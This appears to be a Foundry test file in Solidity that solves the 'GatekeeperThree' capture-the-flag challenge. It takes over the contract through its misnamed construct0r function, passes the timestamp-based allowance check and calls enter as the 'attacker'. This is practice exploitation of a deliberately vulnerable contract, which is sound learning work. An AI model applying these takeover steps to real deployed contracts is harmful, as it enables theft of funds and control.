// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";

contract CounterTest is Test {
    GatekeeperThree victim;
    address attacker = makeAddr("attacker");

    function setUp() public {
        victim = new GatekeeperThree();
    }

    function test_PenitrateContract() public {
        victim.construct0r();

        vm.deal(address(this), 0.0011 ether);
        (bool status, ) = address(victim).call{value: 0.0011 ether}("");
        assertTrue(status);
        victim.createTrick();
        victim.getAllowance(block.timestamp);
        console.log(victim.allowEntrance());
        victim.enter();
        console.log(victim.entrant());
        console.log(attacker.balance);
        assertTrue(victim.entrant() == tx.origin);
    }
}
